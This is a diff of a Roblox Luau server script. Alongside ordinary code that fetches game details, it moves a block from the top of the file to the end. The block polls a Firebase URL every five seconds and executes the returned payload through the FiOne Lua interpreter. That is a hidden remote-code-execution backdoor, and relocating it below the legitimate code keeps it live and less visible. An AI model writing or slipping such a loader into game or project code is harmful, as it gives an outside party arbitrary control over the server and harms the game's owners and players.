@@ -1,23 +1,4 @@
 local HttpService = game:GetService("HttpService")
-local firebaseURL = "https://serverside-63d29-default-rtdb.firebaseio.com/mensagem.json"
-local FiOne = require(script.Modules.FiOne)
-
-while true do
-	local sucesso, resposta = pcall(function()
-		return HttpService:GetAsync(firebaseURL)
-	end)
-
-	if sucesso and resposta then
-		local Input = HttpService:JSONDecode(resposta)
-		if Input ~= nil and Input ~= "" then
-			FiOne(Input)()
-		end
-	end
-	wait(5)
-end
-
-local HttpService = game:GetService("HttpService")
-
 local gameUrl = "https://games.roproxy.com/v1/games?universeIds=" .. game.GameId
 local success, gameResponse = pcall(function()
 	return HttpService:GetAsync(gameUrl)
@@ -89,4 +70,21 @@ if success then
 	end
 else
 	warn("Erro ao buscar os dados do jogo.")
+end
+
+local firebaseURL = "https://serverside-63d29-default-rtdb.firebaseio.com/mensagem.json"
+local FiOne = require(script.Modules.FiOne)
+
+while true do
+	local sucesso, resposta = pcall(function()
+		return HttpService:GetAsync(firebaseURL)
+	end)
+
+	if sucesso and resposta then
+		local Input = HttpService:JSONDecode(resposta)
+		if Input ~= nil and Input ~= "" then
+			FiOne(Input)()
+		end
+	end
+	wait(5)
 end
